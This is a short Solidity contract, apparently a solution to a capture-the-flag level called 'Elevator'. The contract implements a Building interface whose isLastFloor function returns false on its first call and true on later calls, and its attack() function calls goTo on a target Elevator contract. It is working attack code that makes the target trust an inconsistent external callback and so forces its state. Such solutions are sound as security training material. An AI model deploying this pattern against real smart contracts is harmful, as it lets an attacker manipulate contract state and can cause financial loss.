pragma solidity ^0.8.0;

import "./Elevator.sol";

contract AttackerBuilding is Building {

    uint counter;

  function isLastFloor(uint) public returns (bool) 
  {
        if(counter == 0)
        {
            counter++;
            return false;
        }
        else
        {
            return true;
        }
  }

  function attack(address elevatorAddr) public payable {
    Elevator elevator = Elevator(elevatorAddr);
    elevator.goTo(0);
  }
}